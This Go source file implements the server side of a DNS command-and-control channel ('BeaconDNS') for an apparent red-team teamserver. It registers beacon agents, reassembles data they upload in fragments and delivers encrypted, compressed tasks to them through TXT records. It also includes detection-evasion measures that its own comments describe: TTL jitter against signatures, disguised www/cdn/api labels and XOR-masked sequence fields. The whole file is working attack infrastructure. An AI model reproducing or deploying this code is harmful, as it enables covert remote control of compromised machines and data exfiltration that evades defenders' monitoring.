package main

import (
	"bytes"
	"compress/zlib"
	"context"
	"encoding/base32"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"crypto/rc4"

	dns "github.com/miekg/dns"
)

// dnsDebug controls verbose logging for the DNS listener. It is disabled by
// default so that release builds remain quiet. Set to true temporarily when
// troubleshooting BeaconDNS behavior.
const dnsDebug = true

type dnsFragBuf struct {
	total  uint32
	buf    []byte
	filled uint32
}

type dnsDownBuf struct {
	total uint32
	off   uint32
	buf   []byte
}

type DNS struct {
	Config DNSConfig
	Name   string
	Active bool

	server *dns.Server
	ts     Teamserver

	mu        sync.Mutex
	upFrags   map[string]*dnsFragBuf
	downFrags map[string]*dnsDownBuf
}

func (d *DNS) Start(ts Teamserver) error {
	if d.Config.TTL <= 0 {
		d.Config.TTL = 10
	}
	if d.Config.QType == "" {
		d.Config.QType = "TXT"
	}
	if d.Config.PktSize <= 0 || d.Config.PktSize > 64000 {
		d.Config.PktSize = 1024
	}

	// Seed the random number generator for TTL jitter
	rand.Seed(time.Now().UnixNano())

	addr := net.JoinHostPort(d.Config.HostBind, strconv.Itoa(d.Config.PortBind))

	mux := dns.NewServeMux()
	mux.HandleFunc(".", d.handleDNS)

	d.server = &dns.Server{Addr: addr, Net: "udp", Handler: mux}
	d.ts = ts
	d.upFrags = make(map[string]*dnsFragBuf)
	d.downFrags = make(map[string]*dnsDownBuf)

	go func() {
		if err := d.server.ListenAndServe(); err != nil {
			if dnsDebug {
				fmt.Printf("[BeaconDNS] listener error: %v\n", err)
			}
		}
	}()

	time.Sleep(200 * time.Millisecond)
	d.Active = true
	return nil
}

func (d *DNS) Stop() error {
	d.Active = false
	if d.server == nil {
		return nil
	}
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	return d.server.ShutdownContext(ctx)
}

func (d *DNS) handlePutFragment(sid string, seq int, data []byte) {
	if sid == "" || len(data) == 0 {
		_ = d.ts.TsAgentProcessData(sid, data)
		return
	}
	if len(data) <= 8 {
		_ = d.ts.TsAgentProcessData(sid, data)
		return
	}

	total := binary.BigEndian.Uint32(data[0:4])
	offset := binary.BigEndian.Uint32(data[4:8])
	chunk := data[8:]

	const maxUploadSize = 4 << 20 // 4MB 上行限制，与 Beacon 端 ConnectorDNS 保持一致
	if total == 0 || total > maxUploadSize {
		_ = d.ts.TsAgentProcessData(sid, data)
		return
	}

	if offset == 0 && total <= uint32(len(chunk)) {
		_ = d.ts.TsAgentProcessData(sid, chunk)
		return
	}

	key := sid

	d.mu.Lock()
	defer d.mu.Unlock()

	fb, ok := d.upFrags[key]
	if !ok {
		buf := make([]byte, total)
		fb = &dnsFragBuf{total: total, buf: buf}
		d.upFrags[key] = fb
	}
	if offset >= fb.total {
		return
	}
	end := offset + uint32(len(chunk))
	if end > fb.total {
		end = fb.total
	}
	n := end - offset
	copy(fb.buf[offset:end], chunk[:n])
	fb.filled += n

	if dnsDebug {
		fmt.Printf("[BeaconDNS] [FRAG] Reassembling sid=%s | Got %d bytes (Offset: %d / Total: %d) | Progress: %d%%\n",
			sid, n, offset, fb.total, (fb.filled*100)/fb.total)
	}

	if fb.filled >= fb.total {
		if dnsDebug {
			fmt.Printf("[BeaconDNS] [UP] Reassembly Complete! sid=%s | Total: %d bytes\n", sid, fb.total)
		}
		_ = d.ts.TsAgentProcessData(sid, fb.buf)
		delete(d.upFrags, key)
	}
}

// 协议约定（简化版）：
// qname = <sid>.<op>.<seq>.<idx>.<data>.<...>.domain
// 其中 data = base32(no padding, upper) 的 RC4(payload)
// sid 建议为 8 字节 ID 的 16 位 hex 字符串，op = HI/PUT/GET
func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	// Randomize TTL to evade static signature detection
	// Base TTL from config, plus a random jitter (0-60 seconds)
	baseTTL := uint32(d.Config.TTL)
	if baseTTL == 0 {
		baseTTL = 10
	}
	// Use math/rand (global instance is safe enough here)
	ttl := baseTTL + uint32(rand.Intn(60))

	// Determine response type based on the REQUEST's Qtype, not just the config.
	// This fixes the bug where an A-record heartbeat received a TXT response.
	reqQType := dns.TypeTXT // default
	if len(r.Question) > 0 {
		reqQType = r.Question[0].Qtype
	}

	for _, q := range r.Question {
		labels := dns.SplitDomainName(q.Name)
		base := labels

		if d.Config.Domain != "" {
			dom := strings.TrimSuffix(strings.ToLower(d.Config.Domain), ".")
			for i := range labels {
				tail := strings.ToLower(strings.Join(labels[i:], "."))
				if tail == dom {
					base = labels[:i]
					break
				}
			}
		}

		var sid, op string
		var seq, idx int
		var dataB []byte

		if len(base) >= 5 {
			sid = base[0]
			rawOp := strings.ToLower(base[1])
			switch rawOp {
			case "www", "hi":
				op = "HI"
			case "cdn", "put":
				op = "PUT"
			case "api", "get":
				op = "GET"
			default:
				// invalid op
				op = ""
			}

			if v, err := strconv.ParseUint(base[2], 16, 32); err == nil {
				seq = int(v ^ 0x39913991)
			}
			if v, err := strconv.ParseUint(base[3], 16, 32); err == nil {
				idx = int(v ^ 0x39913991)
			}

			_ = seq
			_ = idx

			dataLabel := strings.Join(base[4:], "")
			enc := base32.StdEncoding.WithPadding(base32.NoPadding)
			dataLabel = strings.ToUpper(dataLabel)
			if db, err := enc.DecodeString(dataLabel); err == nil {
				dataB = db
			}
		}

		// basic anti-abuse validation: sid must be 8-char hex, and payload
		// size should not grow unbounded beyond configured packet size.
		if sid != "" {
			validSid := len(sid) == 8
			if validSid {
				for i := 0; i < 8; i++ {
					c := sid[i]
					if !(c >= '0' && c <= '9' || c >= 'a' && c <= 'f' || c >= 'A' && c <= 'F') {
						validSid = false
						break
					}
				}
			}
			if !validSid {
				// invalid sid: do not treat as a beacon frame
				op = ""
			}
		}

		maxPayload := d.Config.PktSize * 4
		if maxPayload <= 0 {
			maxPayload = 4096
		}
		if len(dataB) > maxPayload {
			dataB = nil
		}

		if dnsDebug {
			remote := ""
			if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
				remote = addr.IP.String()
			}

			// Enhanced Logging
			logPrefix := "[???]"
			logDetails := ""

			if op == "HI" {
				logPrefix = "[HI]"
				logDetails = fmt.Sprintf("New Session Init (len=%d)", len(dataB))
			} else if op == "PUT" {
				logPrefix = "[UP]"
				logDetails = fmt.Sprintf("Data Upload (len=%d)", len(dataB))
			} else if op == "GET" {
				if reqQType == dns.TypeA {
					logPrefix = "[HB]" // Heartbeat
					logDetails = "Keep-Alive (A)"
				} else {
					logPrefix = "[DOWN]"
					logDetails = "Data Poll (TXT)"
				}
			}

			if sid != "" {
				fmt.Printf("[BeaconDNS] %s %s | sid=%s seq=%d idx=%d | src=%s\n",
					logPrefix, logDetails, sid, seq, idx, remote)
			}
		}

		switch op {
		case "HI", "PUT":
			if len(dataB) > 0 {
				if op == "HI" {
					// HI：尝试解出 beat 头，创建 Agent
					keyBytes, _ := hex.DecodeString(d.Config.EncryptKey)
					if len(keyBytes) == 16 && len(dataB) >= 8 {
						if c, e := rc4.NewCipher(keyBytes); e == nil {
							fullBeat := make([]byte, len(dataB))
							c.XORKeyStream(fullBeat, dataB)
							if len(fullBeat) >= 8 {
								agentType := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[:4]))
								agentId := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[4:8]))
								// HTTP 通道会把前 8 字节 (type+id) 剥离后再传给 AgentCreate，
								// DNS 这里也保持同样格式，只把剩余部分作为 beat 传入。
								beat := fullBeat[8:]
								if !d.ts.TsAgentIsExists(agentId) {
									externalIP := ""
									if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
										externalIP = addr.IP.String()
									}
									if dnsDebug {
										fmt.Printf("[BeaconDNS] HI create agent type=%s id=%s ip=%s\n", agentType, agentId, externalIP)
									}
									_, _ = d.ts.TsAgentCreate(agentType, agentId, beat, d.Name, externalIP, true)
								}
								_ = d.ts.TsAgentSetTick(agentId)
							}
						}
					}
				}
				// PUT：将payload交给 TS，sid 作为逻辑会话 ID（要求 Beacon 端保持一致）
				if op == "PUT" {
					if dnsDebug {
						fmt.Printf("[BeaconDNS] %s payload len=%d sid=%s\n", op, len(dataB), sid)
					}
					// 应用层分片由 handlePutFragment 负责重组
					d.handlePutFragment(sid, seq, dataB)
					if sid != "" {
						_ = d.ts.TsAgentSetTick(sid)
					}
				}
			}
			// ACK：返回一个最小响应（不同 QType 返回不同 RR，以降低特征）
			if reqQType == dns.TypeA {
				rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("127.0.0.1").To4()}
				m.Answer = append(m.Answer, rr)
			} else if reqQType == dns.TypeAAAA {
				rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: net.ParseIP("::1").To16()}
				m.Answer = append(m.Answer, rr)
			} else {
				rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{"OK"}}
				m.Answer = append(m.Answer, rr)
			}

		case "GET":
			if sid != "" {
				_ = d.ts.TsAgentSetTick(sid)
			}

			// 1. 检查并准备任务数据（无论是 A 还是 TXT 请求，都先确保 downFrags 缓存了最新任务）
			var df *dnsDownBuf
			if sid != "" {
				d.mu.Lock()
				if buf, ok := d.downFrags[sid]; ok {
					df = buf
				}
				d.mu.Unlock()

				// 如果没有缓存或已发送完，尝试从 TS 获取新任务并缓存
				if df == nil || df.off >= df.total {
					maxDataSize := d.Config.PktSize * 256
					if maxDataSize <= 0 || maxDataSize > (4<<20) {
						maxDataSize = 4 << 20
					}
					if p, err := d.ts.TsAgentGetHostedTasks(sid, maxDataSize); err == nil && len(p) > 0 {
						if dnsDebug {
							fmt.Printf("[BeaconDNS] GET tasks sid=%s total=%d\n", sid, len(p))
						}
						origLen := len(p)
						flags := byte(0)
						payload := p

						// zlib 压缩
						const minCompressSize = 2048
						if origLen > minCompressSize {
							var zbuf bytes.Buffer
							w, errW := zlib.NewWriterLevel(&zbuf, zlib.BestCompression)
							if errW == nil {
								if _, errC := w.Write(p); errC == nil && w.Close() == nil {
									comp := zbuf.Bytes()
									if len(comp) > 0 && len(comp) < origLen {
										payload = comp
										flags = 1
									}
								} else {
									_ = w.Close()
								}
							}
						}

						// 构造会话头
						totalLen := 1 + 4 + len(payload)
						buf := make([]byte, totalLen)
						buf[0] = flags
						buf[1] = byte(origLen & 0xFF)
						buf[2] = byte((origLen >> 8) & 0xFF)
						buf[3] = byte((origLen >> 16) & 0xFF)
						buf[4] = byte((origLen >> 24) & 0xFF)
						copy(buf[5:], payload)
						df = &dnsDownBuf{total: uint32(len(buf)), off: 0, buf: buf}

						d.mu.Lock()
						d.downFrags[sid] = df
						d.mu.Unlock()
					}
				}
			}

			// 2. 根据请求类型返回响应
			var frame []byte

			// 如果是 A 记录心跳请求：不返回数据，只返回 flag IP (0.0.0.1 有任务, 0.0.0.0 无任务)
			if reqQType == dns.TypeA {
				hasTasks := (df != nil && df.off < df.total)
				if hasTasks {
					// 有任务 -> 返回 0.0.0.1，通知 Agent 切换 TXT 拉取
					rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.1").To4()}
					m.Answer = append(m.Answer, rr)
				} else {
					// 无任务 -> 返回 0.0.0.0
					rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
					m.Answer = append(m.Answer, rr)
				}
				// 不生成 frame，也不增加 df.off
			} else {
				// 如果是 TXT (或其他) 请求：返回实际数据分片
				if df != nil && df.off < df.total {
					// 为了兼容 TXT RDATA 255 字节长度限制
					maxChunk := d.Config.PktSize
					if maxChunk <= 0 || maxChunk > 247 {
						maxChunk = 247
					}
					remaining := df.total - df.off
					chunkLen := remaining
					if chunkLen > uint32(maxChunk) {
						chunkLen = uint32(maxChunk)
					}

					frame = make([]byte, 8+chunkLen)
					binary.BigEndian.PutUint32(frame[0:4], df.total)
					binary.BigEndian.PutUint32(frame[4:8], df.off)
					copy(frame[8:], df.buf[df.off:df.off+chunkLen])

					if dnsDebug {
						fmt.Printf("[BeaconDNS] [DOWN] Sending Fragment | sid=%s | %d bytes (Offset: %d / Total: %d)\n",
							sid, chunkLen, df.off, df.total)
					}

					df.off += chunkLen
					if df.off >= df.total {
						d.mu.Lock()
						delete(d.downFrags, sid)
						d.mu.Unlock()
					}
				}

				// 生成 TXT 响应
				if len(frame) == 0 {
					// 空 TXT 响应
					if reqQType == dns.TypeA { // Should be handled above, but for safety
						rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
						m.Answer = append(m.Answer, rr)
					} else if reqQType == dns.TypeAAAA {
						rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: net.ParseIP("::").To16()}
						m.Answer = append(m.Answer, rr)
					} else {
						rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{""}}
						m.Answer = append(m.Answer, rr)
					}
				} else {
					// 有数据 TXT 响应
					if reqQType == dns.TypeA {
						// This path should NOT be reached given the logic above (A record handled separately)
						// But if we forced frame generation for A, we would chunk it here.
						// Since we use 0.0.0.1 signaling, this block is effectively dead code for A,
						// but we keep it for structure.
					} else if reqQType == dns.TypeAAAA {
						// Similar to A, if AAAA used for data transport
						start := 0
						maxBytes := d.Config.PktSize
						if maxBytes%16 != 0 {
							maxBytes = maxBytes - (maxBytes % 16)
						}
						if maxBytes <= 0 {
							maxBytes = 16
						}
						endLimit := start + maxBytes
						if endLimit > len(frame) {
							endLimit = len(frame)
						}
						for start < endLimit {
							end := start + 16
							if end > endLimit {
								end = endLimit
							}
							chunk := make([]byte, 16)
							copy(chunk, frame[start:end])
							ip := net.IP(chunk)
							rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: ip}
							m.Answer = append(m.Answer, rr)
							start = end
						}
					} else {
						// TXT: 直接用 frame 构造单条 TXT 记录
						rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{string(frame)}}
						m.Answer = append(m.Answer, rr)
					}
				}
			}
			// GET 处理结束，break switch

		default:
			// 未知 op：简单 keep-alive
			rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{"OK"}}
			m.Answer = append(m.Answer, rr)
		}
	}

	_ = w.WriteMsg(m)
}
